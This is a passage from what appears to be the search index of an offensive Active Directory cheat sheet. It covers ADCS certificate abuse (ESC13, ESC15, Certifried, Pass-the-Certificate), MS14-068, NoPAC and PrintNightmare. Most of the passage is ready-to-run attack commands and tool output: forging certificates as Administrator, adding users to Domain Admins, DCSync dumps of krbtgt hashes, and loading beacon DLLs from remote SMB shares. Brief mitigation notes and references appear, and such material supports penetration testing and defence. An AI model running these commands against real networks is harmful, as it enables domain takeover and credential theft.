{$_.IdentityReference -eq \"DUMPSTER\\ESC13User\"}\nAccessControlType     : Allow\n\n# check if there is an issuance policy in the msPKI-Certificate-Policy\nPS C:\\&gt; Get-ADObject \"CN=ESC13Template,$TemplateContainer\" -Properties msPKI-Certificate-Policy\nmsPKI-Certificate-Policy : {1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.3651508.12319448}\n\n# check for OID group link\nPS C:\\&gt; Get-ADObject \"CN=12319448.2C2B96A74878E00434BEDD82A61861C5,$OIDContainer\" -Properties DisplayName,msPKI-Cert-Template-OID,msDS-OIDToGroupLink\nmsDS-OIDToGroupLink     : CN=ESC13Group,OU=Groups,OU=Tier0,DC=dumpster,DC=fire\n\n# verify if ESC13Group is a Universal group\nPS C:\\&gt; Get-ADGroup ESC13Group -Properties Members\nGroupScope        : Universal\nMembers           : {}\n</code></pre> <p>Exploitation:</p> <ul> <li>Request a certificate for the vulnerable template</li> </ul> <pre><code>PS C:\\&gt; .\\Certify.exe request /ca:DC01\\dumpster-DC01-CA /template:ESC13Template\n</code></pre> <ul> <li>Merge into a PFX file</li> </ul> <pre><code>PS C:\\&gt; certutil -MergePFX .\\esc13.pem .\\esc13.pfx\n</code></pre> <ul> <li>Verify the presence of the \"Client Authentication\" and the \"Policy Identifier\"</li> </ul> <pre><code>PS C:\\&gt; certutil -Dump -v .\\esc13.pfx\n</code></pre> <ul> <li>Ask a TGT for our user, but we are also member of the linked group and inherited their privileges</li> </ul> <pre><code>PS C:\\&gt; .\\Rubeus.exe asktgt /user:ESC13User /certificate:C:\\esc13.pfx /nowrap\n</code></pre>"},{"location":"example/ad-adcs-certificate-services/#esc15-ekuwu-application-policies-cve-2024-49019","title":"ESC15 - EKUwu Application Policies - CVE-2024-49019","text":"<p>This technique now has a CVE number and was patched on November 12, See Active Directory Certificate Services Elevation of Privilege Vulnerability - CVE-2024-49019 for more information.</p> <p>Requirements</p> <ul> <li>Template Schema Version 1</li> <li>ENROLLEE_SUPPLIES_SUBJECT = <code>True</code></li> </ul> <p>Exploitation:</p> <p>Detect the vulnerability from BloodHound data using the following cypher query.</p> <pre><code>MATCH p=(:Base)-[:MemberOf*0..]-&gt;()-[:Enroll|AllExtendedRights]-&gt;(ct:CertTemplate)-[:PublishedTo]-&gt;(:EnterpriseCA)-[:TrustedForNTAuth]-&gt;(:NTAuthStore)-[:NTAuthStoreFor]-&gt;(:Domain) WHERE ct.enrolleesuppliessubject = True AND ct.authenticationenabled = False AND ct.requiresmanagerapproval = False AND ct.schemaversion = 1 RETURN p\n</code></pre> <p>The Application Policies extension is a proprietary certificate extension with the OID <code>1.3.6.1.4.1.311</code>, same as x509 EKUs. It was designed to allow users to specify additional use cases for certificates by utilizing the same OIDs as those in the Enhanced Key Usage extension. If there is a conflict between an Application Policy and an EKU, then Microsoft prefers the proprietary Application Policy.</p> <p>\"Application policy is Microsoft specific and is treated much like Extended Key Usage. If a certificate has an extension containing an application policy and also has an EKU extension, the EKU extension is ignored.\" - Microsoft</p> <p>When a user requests a certificate based on a schema version 1 template and includes an application policy, the policy is incorporated into the certificate. This allows users to specify arbitrary EKUs, bypassing the requirements for ESC2.</p> <p>ESC1 - The WebServer template is enabled by default in ADCS, requires a user-supplied SAN and only has the <code>Server Authentication</code> EKU. Using ly4k/Certipy PR #228, we can add the <code>Client Authentication</code> EKU to <code>WebServer</code>. Anybody with the <code>Enroll</code> permission on this template can now compromise the domain.</p> <pre><code>certipy req -dc-ip 10.10.10.10 -ca CA -target-ip 10.10.10.11 -u user@domain.com -p 'P@ssw0rd' -template WebServer -upn Administrator@domain.com --application-policies 'Client Authentication'\ncertipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell\n\n# in LDAP shell\nadd_user pentest_user\nadd_user_to_group pentest_user \"Domain Admins\"\n</code></pre> <p>ESC2/ESC3 - Certificate Request Agent (<code>1.3.6.1.4.1.311.20.2.1</code>),</p> <pre><code>certipy -req -u user@domain.com -p 'P@ssw0rd' --application-policies \"1.3.6.1.4.1.311.20.2.1\" -ca \"Lab Root CA\" -template WebServer -dc-ip 10.10.10.10 -target-ip 10.10.10.11\ncertipy -req -u user@domain.com -p 'P@ssw0rd' -on-behalf-of DOMAIN\\\\Administrator -Template User -ca \"Lab Root CA\" -pfx user.pfx -dc-ip 10.10.10.10 -target-ip 10.10.10.11\ncertipy auth -pfx administrator.pfx -dc-ip 10.10.10.10\n</code></pre>"},{"location":"example/ad-adcs-certificate-services/#certifried-cve-2022-26923","title":"Certifried CVE-2022-26923","text":"<p>An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.</p> <ul> <li>Find <code>ms-DS-MachineAccountQuota</code></li> </ul> <pre><code>bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 get object 'DC=lab,DC=local' --attr ms-DS-MachineAccountQuota \n</code></pre> <ul> <li>Add a new computer in the Active Directory, by default <code>MachineAccountQuota = 10</code></li> </ul> <pre><code>bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 add computer cve 'CVEPassword1234*'\ncertipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'\n</code></pre> <ul> <li>[ALTERNATIVE] If you are <code>SYSTEM</code> and the <code>MachineAccountQuota=0</code>: Use a ticket for the current machine and reset its SPN</li> </ul> <pre><code>Rubeus.exe tgtdeleg\nexport KRB5CCNAME=/tmp/ws02.ccache\nbloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local set object 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName\n</code></pre> <ul> <li>Set the <code>dNSHostName</code> attribute to match the Domain Controller hostname</li> </ul> <pre><code>bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 set object 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName -v DC.lab.local\nbloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 get object 'CN=cve,CN=Computers,DC=lab,DC=local' --attr dNSHostName\n</code></pre> <ul> <li>Request a ticket</li> </ul> <pre><code># certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA\ncertipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA\n</code></pre> <ul> <li>Either use the pfx or set a RBCD on your machine account to takeover the domain</li> </ul> <pre><code>certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10\n\nopenssl pkcs12 -in dc.pfx -out dc.pem -nodes\nbloodyAD -d lab.local  -c \":dc.pem\" -u 'cve$' --host 10.10.10.10 add rbcd 'CRASHDC$' 'CVE$'\ngetST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'   \nsecretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 \n</code></pre>"},{"location":"example/ad-adcs-certificate-services/#pass-the-certificate","title":"Pass-The-Certificate","text":"<p>Pass the Certificate in order to get a TGT, this technique is used in \"UnPAC the Hash\" and \"Shadow Credential\"</p> <ul> <li>Windows</li> </ul> <pre><code># Information about a cert file\ncertutil -v -dump admin.pfx\n\n# From a Base64 PFX\nRubeus.exe asktgt /user:\"TARGET_SAMNAME\" /certificate:cert.pfx /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /show\n\n# Grant DCSync rights to an user\n./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \"DC=domain,DC=local\" --sid &lt;user_SID&gt;\n# To restore\n./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \"DC=domain,DC=local\" --restore restoration_file.txt\n</code></pre> <ul> <li>Linux</li> </ul> <pre><code># Base64-encoded PFX certificate (string) (password can be set)\ngettgtpkinit.py -pfx-base64 $(cat \"PATH_TO_B64_PFX_CERT\") \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n\u200b\n# PEM certificate (file) + PEM private key (file)\ngettgtpkinit.py -cert-pem \"PATH_TO_PEM_CERT\" -key-pem \"PATH_TO_PEM_KEY\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n\n# PFX certificate (file) + password (string, optionnal)\ngettgtpkinit.py -cert-pfx \"PATH_TO_PFX_CERT\" -pfx-pass \"CERT_PASSWORD\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n\n# Using Certipy\ncertipy auth -pfx \"PATH_TO_PFX_CERT\" -dc-ip 'dc-ip' -username 'user' -domain 'domain'\ncertipy cert -export -pfx \"PATH_TO_PFX_CERT\" -password \"CERT_PASSWORD\" -out \"unprotected.pfx\"\n</code></pre>"},{"location":"example/ad-adcs-certificate-services/#pkinit-error","title":"PKINIT ERROR","text":"<p>When the DC does not support PKINIT (the pre-authentication allowing to retrieve either TGT or NT Hash using certificate). You will get an error like the following in the tool's output.</p> <pre><code>$ certipy auth -pfx \"PATH_TO_PFX_CERT\" -dc-ip 'dc-ip' -username 'user' -domain 'domain'\n[...]\nKDC_ERROR_CLIENT_NOT_TRUSTED (Reserved for PKINIT)\n</code></pre> <p>There is still a way to use the certificate to takeover the account.</p> <ul> <li> <p>Open an LDAP shell using the certificate     <pre><code>certipy auth -pfx target.pfx -debug -username username -domain domain.local -dns-tcp -dc-ip 10.10.10.10 -ldap-shell\n</code></pre></p> </li> <li> <p>Add a computer for RBCD     <pre><code>impacket-addcomputer -dc-ip 10.10.10.10 DOMAIN.LOCAL/User:P@ssw0rd -computer-name \"NEWCOMPUTER\" -computer-pass \"P@ssw0rd123*\"\n</code></pre></p> </li> <li> <p>Set the RBCD     <pre><code>set_rbcd 'TARGET$' 'NEWCOMPUTER$'\n</code></pre></p> </li> <li> <p>Request a ticket with impersonation     <pre><code>impacket-getST -spn 'cifs/target.domain.local' -impersonate 'target$' -dc-ip 10.10.10.10 'DOMAIN.LOCAL/NEWCOMPUTER$:P@ssw0rd123*'\n</code></pre></p> </li> <li> <p>Use the ticket     <pre><code>export KRB5CCNAME=DC$.ccache\nimpacket-secretsdump.py 'target$'@target.domain.local -k -no-pass -dc-ip 10.10.10.10 -just-dc-user 'krbtgt'\n</code></pre></p> </li> </ul>"},{"location":"example/ad-adcs-certificate-services/#unpac-the-hash","title":"UnPAC The Hash","text":"<p>Using the UnPAC The Hash method, you can retrieve the NT Hash for an User via its certificate.</p> <ul> <li> <p>Windows</p> <pre><code># Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.\nRubeus.exe asktgt /getcredentials /user:\"TARGET_SAMNAME\" /certificate:\"BASE64_CERTIFICATE\" /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /show\n</code></pre> </li> <li> <p>Linux</p> <pre><code># Obtain a TGT by validating a PKINIT pre-authentication\n$ gettgtpkinit.py -cert-pfx \"PATH_TO_CERTIFICATE\" -pfx-pass \"CERTIFICATE_PASSWORD\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n\n# Use the session key to recover the NT hash\n$ export KRB5CCNAME=\"TGT_CCACHE_FILE\" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'\n</code></pre> </li> </ul>"},{"location":"example/ad-adcs-certificate-services/#references","title":"References","text":"<ul> <li>Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021</li> <li>Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_</li> <li>Certified Pre-Owned - Will Schroeder - Jun 17 2021</li> <li>Microsoft ADCS \u2013 Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021</li> <li>NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema</li> <li>AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021</li> <li>ADCS: Playing with ESC4 - Matthew Creel</li> <li>AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022</li> <li>AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Mart\u00ednez, Kurosh Dabbagh</li> <li>Certifried: Active Directory Domain Privilege Escalation (CVE-2022\u201326923) - Oliver Lyak</li> <li>UnPAC the hash - The Hacker Recipes</li> <li>AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev</li> <li>Relaying to AD Certificate Services over RPC - NOVEMBER 16, 2022 - SYLVAIN HEINIGER</li> <li>bloodyAD and CVE-2022-26923 - soka - 11 May 2022</li> <li>Certificates and Pwnage and Patches, Oh My! - Will Schroeder - Nov 9, 2022</li> <li>Certificate templates - The Hacker Recipes</li> <li>CA configuration - The Hacker Recipes</li> <li>Access controls - The Hacker Recipes</li> <li>Web endpoints - The Hacker Recipes</li> <li>ADCS ESC13 Abuse Technique - Jonas B\u00fclow Knudsen - 02/15/2024</li> <li>From DA to EA with ESC5 - Andy Robbins - May 16, 2023</li> <li>ADCS ESC14 Abuse Technique - Jonas B\u00fclow Knudsen - 02/01/2024</li> <li>ADCS Attack Paths in BloodHound \u2014 Part 2 - Jonas B\u00fclow Knudsen - May 1, 2024</li> <li>ESC12 \u2013 Shell access to ADCS CA with YubiHSM - hajo - October 2023</li> <li>AD CS Domain Escalation - HackTricks</li> <li>ESC15/EKUwu PR #228 - dru1d-foofus - 10/08/2024</li> <li>EKUwu: Not just another AD CS ESC - Justin Bollinger - October 08, 2024</li> <li>ADCS Exploitation Part 2: Certificate Mapping + ESC15 - Giulio Pierantoni - Oct 10, 2024</li> </ul>"},{"location":"example/CVE/MS14-068/","title":"MS14-068 Checksum Validation","text":"<p>This exploit require to know the user SID, you can use <code>rpcclient</code> to remotely get it or <code>wmi</code> if you have an access on the machine.</p> <ul> <li>RPCClient   <pre><code>rpcclient $&gt; lookupnames john.smith\njohn.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)\n</code></pre></li> <li>WMI   <pre><code>wmic useraccount get name,sid\nAdministrator  S-1-5-21-3415849876-833628785-5197346142-500   \nGuest          S-1-5-21-3415849876-833628785-5197346142-501   \nAdministrator  S-1-5-21-297520375-2634728305-5197346142-500   \nGuest          S-1-5-21-297520375-2634728305-5197346142-501   \nkrbtgt         S-1-5-21-297520375-2634728305-5197346142-502   \nlambda         S-1-5-21-297520375-2634728305-5197346142-1110 \n</code></pre></li> <li>Powerview   <pre><code>Convert-NameToSid high-sec-corp.localkrbtgt\nS-1-5-21-2941561648-383941485-1389968811-502\n</code></pre></li> <li>netexec: <code>netexec ldap DC1.lab.local -u username -p password -k --get-sid</code> </li> </ul> <pre><code>Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068\n</code></pre> <p>Generate a ticket with <code>metasploit</code> or <code>pykek</code></p> <pre><code>Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum\n   Name      Current Setting                                Required  Description\n   ----      ---------------                                --------  -----------\n   DOMAIN    LABDOMAIN.LOCAL                                yes       The Domain (upper case) Ex: DEMO.LOCAL\n   PASSWORD  P@ssw0rd                                       yes       The Domain User password\n   RHOSTS    10.10.10.10                                    yes       The target address range or CIDR identifier\n   RPORT     88                                             yes       The target port\n   Timeout   10                                             yes       The TCP timeout to establish connection and read data\n   USER      lambda                                         yes       The Domain User\n   USER_SID  S-1-5-21-297520375-2634728305-5197346142-1106  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000\n</code></pre> <pre><code># Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek\n$ git clone https://github.com/SecWiki/windows-kernel-exploits\n$ python ./ms14-068.py -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt; -p &lt;clearPassword&gt;\n$ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org\n$ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10\n$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066\n-1105\n  [+] Building AS-REQ for msfdc01.metasploitable.local... Done!\n  [+] Sending AS-REQ to msfdc01.metasploitable.local... Done!\n  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!\n  [+] Parsing AS-REP from msfdc01.metasploitable.local... Done!\n  [+] Building TGS-REQ for msfdc01.metasploitable.local... Done!\n  [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!\n  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!\n  [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!\n  [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done!\n</code></pre> <p>Then use <code>mimikatz</code> to load the ticket.</p> <pre><code>mimikatz.exe \"kerberos::ptc c:\\temp\\TGT_darthsidious@lab.adsecurity.org.ccache\"\n</code></pre>"},{"location":"example/CVE/MS14-068/#mitigations","title":"Mitigations","text":"<ul> <li>Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780</li> </ul>"},{"location":"example/CVE/MS14-068/#references","title":"References","text":"<ul> <li>Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace</li> </ul>"},{"location":"example/CVE/NoPAC/","title":"NoPAC / samAccountName Spoofing","text":"<p>During S4U2Self, the KDC will try to append a '\\$' to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller's sAMAccountName - without the '\\$'. For instance, suppose there is a domain controller with a sAMAccountName set to 'DC\\$'. An attacker would then create a machine account with the sAMAccountName set to 'DC'. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a ST to itself as any user. Since the machine account with the sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the domain controller. The KDC will then issue a valid ST for the domain controller.</p> <p>Requirements</p> <ul> <li>MachineAccountQuota &gt; 0</li> </ul> <p>Check for exploitation</p> <ol> <li>Check the MachineAccountQuota of the account   <pre><code>netexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ\nStandIn.exe --object ms-DS-MachineAccountQuota=*\n</code></pre></li> <li>Check if the DC is vulnerable   <pre><code>netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac\n</code></pre></li> </ol> <p>Exploitation</p> <ol> <li>Create a computer account     <pre><code>impacket@linux&gt; addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'\n\npowermad@windows&gt; . .\\Powermad.ps1\npowermad@windows&gt; $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force\npowermad@windows&gt; New-MachineAccount -MachineAccount \"ControlledComputer\" -Password $($password) -Domain \"domain.local\" -DomainController \"DomainController.domain.local\" -Verbose\n\nsharpmad@windows&gt; Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword\n</code></pre></li> <li>Clear the controlled machine account <code>servicePrincipalName</code> attribute     <pre><code>krbrelayx@linux&gt; addspn.py -u 'domain\\user' -p 'password' -t 'ControlledComputer$' -c DomainController\n\npowershell@windows&gt; . .\\Powerview.ps1\npowershell@windows&gt; Set-DomainObject \"CN=ControlledComputer,CN=Computers,DC=domain,DC=local\" -Clear 'serviceprincipalname' -Verbose\n</code></pre></li> <li>(CVE-2021-42278) Change the controlled machine account <code>sAMAccountName</code> to a Domain Controller's name without the trailing <code>$</code> <pre><code># https://github.com/SecureAuthCorp/impacket/pull/1224\nimpacket@linux&gt; renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'\n\npowermad@windows&gt; Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"DomainController\" -Attribute samaccountname -Verbose\n</code></pre></li> <li>Request a TGT for the controlled machine account     <pre><code>impacket@linux&gt; getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'\n\ncmd@windows&gt; Rubeus.exe asktgt /user:\"DomainController\" /password:\"ComputerPassword\" /domain:\"domain.local\" /dc:\"DomainController.domain.local\" /nowrap\n</code></pre></li> <li>Reset the controlled machine account sAMAccountName to its old value      <pre><code>impacket@linux&gt; renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'\n\npowermad@windows&gt; Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"ControlledComputer\" -Attribute samaccountname -Verbose\n</code></pre></li> <li>(CVE-2021-42287) Request a service ticket with <code>S4U2self</code> by presenting the TGT obtained before     <pre><code># https://github.com/SecureAuthCorp/impacket/pull/1202\nimpacket@linux&gt; KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'\n\ncmd@windows&gt; Rubeus.exe s4u /self /impersonateuser:\"DomainAdmin\" /altservice:\"ldap/DomainController.domain.local\" /dc:\"DomainController.domain.local\" /ptt /ticket:[Base64 TGT]\n</code></pre></li> <li>DCSync     <pre><code>KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'\n</code></pre></li> </ol> <p>Automated exploitation:</p> <ul> <li>cube0x0/noPac - Windows     <pre><code>noPac.exe scan -domain htb.local -user user -pass 'password123'\nnoPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt\nnoPac.exe -domain htb.local -user domain_user -pass \"Password123!\" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator\n</code></pre></li> <li>Ridter/noPac - Linux   <pre><code>python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump\n</code></pre></li> <li>WazeHell/sam-the-admin <pre><code>$ python3 sam_the_admin.py \"domain/user:password\" -dc-ip 10.10.10.10 -shell\n[*] Selected Target dc.caltech.white                                              \n[*] Total Domain Admins 11                                                        \n[*] will try to impersonat gaylene.dreddy                                         \n[*] Current ms-DS-MachineAccountQuota = 10                                        \n[*] Adding Computer Account \"SAMTHEADMIN-11$\"                                     \n[*] MachineAccount \"SAMTHEADMIN-11$\" password = EhFMT%mzmACL                      \n[*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL.\n[*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white   \n[*] SAMTHEADMIN-11$ sAMAccountName == dc                                          \n[*] Saving ticket in dc.ccache                                                    \n[*] Resting the machine account to SAMTHEADMIN-11$                                \n[*] Restored SAMTHEADMIN-11$ sAMAccountName to original value                     \n[*] Using TGT from cache                                                          \n[*] Impersonating gaylene.dreddy                                                  \n[*]     Requesting S4U2self                                                       \n[*] Saving ticket in gaylene.dreddy.ccache                                        \n[!] Launching semi-interactive shell - Careful what you execute                   \nC:\\Windows\\system32&gt;whoami                                                        \nnt authority\\system \n</code></pre></li> <li>ly4k/Pachine <pre><code>usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local]\n              [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip]\n              [domain/]username[:password]\n$ python3 pachine.py -dc-host dc.domain.local -scan 'domain.local/john:Passw0rd!'\n$ python3 pachine.py -dc-host dc.domain.local -spn cifs/dc.domain.local -impersonate administrator 'domain.local/john:Passw0rd!'\n$ export KRB5CCNAME=$PWD/administrator@domain.local.ccache\n$ impacket-psexec -k -no-pass 'domain.local/administrator@dc.domain.local'\n</code></pre></li> </ul> <p>Mitigations:</p> <ul> <li>KB5007247 - Windows Server 2012 R2</li> <li>KB5008601 - Windows Server 2016</li> <li>KB5008602 - Windows Server 2019</li> <li>KB5007205 - Windows Server 2022</li> <li>KB5008102</li> <li>KB5008380</li> </ul>"},{"location":"example/CVE/NoPAC/#references","title":"References","text":"<ul> <li>sAMAccountName spoofing - The Hacker Recipes</li> </ul>"},{"location":"example/CVE/PrintNightmare/","title":"PrintNightmare","text":"<p>CVE-2021-1675 / CVE-2021-34527</p> <p>The DLL will be stored in <code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\</code>. The exploit will execute the DLL either from the local filesystem or a remote share.</p> <p>Requirements:</p> <ul> <li>Spooler Service enabled (Mandatory)</li> <li>Server with patches &lt; June 2021</li> <li>DC with <code>Pre Windows 2000 Compatibility</code> group</li> <li>Server with registry key <code>HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\\NoWarningNoElevationOnInstall</code> = (DWORD) 1</li> <li>Server with registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA</code> = (DWORD) 0</li> </ul> <p>Detect the vulnerability:</p> <ul> <li>Impacket - rpcdump <pre><code>python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'\nProtocol: [MS-RPRN]: Print System Remote Protocol\n</code></pre></li> <li>It Was All A Dream <pre><code>git clone https://github.com/byt3bl33d3r/ItWasAllADream\ncd ItWasAllADream &amp;&amp; poetry install &amp;&amp; poetry shell\nitwasalladream -u user -p Password123 -d domain 10.10.10.10/24\ndocker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10\n</code></pre></li> </ul> <p>Payload Hosting: </p> <ul> <li>The payload can be hosted on Impacket SMB server since PR #1109:   <pre><code>python3 ./smbserver.py share /tmp/smb/\n</code></pre></li> <li>Using Invoke-BuildAnonymousSMBServer (Admin rights required on host):    <pre><code>Import-Module .\\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\\Share -Mode Enable\n</code></pre></li> <li>Using WebDav with SharpWebServer (Doesn't require admin rights):   <pre><code>SharpWebServer.exe port=8888 dir=c:\\users\\public verbose=true\n</code></pre></li> </ul> <p>When using WebDav instead of SMB, you must add <code>@[PORT]</code> to the hostname in the URI, e.g.: <code>\\\\172.16.1.5@8888\\Downloads\\beacon.dll</code> WebDav client must be activated on exploited target. By default it is not activated on Windows workstations (you have to <code>net start webclient</code>) and it's not installed on servers. Here is how to detect activated webdav:</p> <pre><code>nxc smb -u user -p password -d domain.local -M webdav [TARGET]\n</code></pre> <p>Trigger the exploit: </p> <ul> <li>SharpNightmare <pre><code># require a modified Impacket: https://github.com/cube0x0/impacket\npython3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll'\npython3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\\addCube.dll'\n## LPE\nSharpPrintNightmare.exe C:\\addCube.dll\n## RCE using existing context\nSharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_addb31f9bff9e936\\Amd64\\UNIDRV.DLL' '\\\\192.168.1.20'\n## RCE using runas /netonly\nSharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll'  'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL' '\\\\192.168.1.10' hackit.local domain_user Pass123\n</code></pre></li> <li>Invoke-Nightmare <pre><code>## LPE only (PS1 + DLL)\nImport-Module .\\cve-2021-1675.ps1\nInvoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default\nInvoke-Nightmare -DriverName \"Dementor\" -NewUser \"d3m3nt0r\" -NewPassword \"AzkabanUnleashed123*\" \nInvoke-Nightmare -DLL \"C:\\absolute\\path\\to\\your\\bindshell.dll\"\n</code></pre></li> <li>Mimikatz v2.2.0-20210709+ <pre><code>## LPE\nmisc::printnightmare /server:DC01 /library:C:\\Users\\user1\\Documents\\mimispool.dll\n## RCE\nmisc::printnightmare /server:CASTLE /library:\\\\10.0.2.12\\smb\\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50\n</code></pre></li> <li>PrintNightmare - @outflanknl <pre><code>PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password]\n</code></pre></li> </ul> <p>Debug informations</p> Error Message Debug 0x5 <code>rpc_s_access_denied</code> Permissions on the file in the SMB share 0x525 <code>ERROR_NO_SUCH_USER</code> The specified account does not exist. 0x180 unknown error code Share is not SMB2"},{"location":"example/CVE/PrintNightmare/#references","title":"References","text":"<ul> <li>Playing with PrintNightmare - 0xdf - Jul 8, 2021</li> <li>A Practical 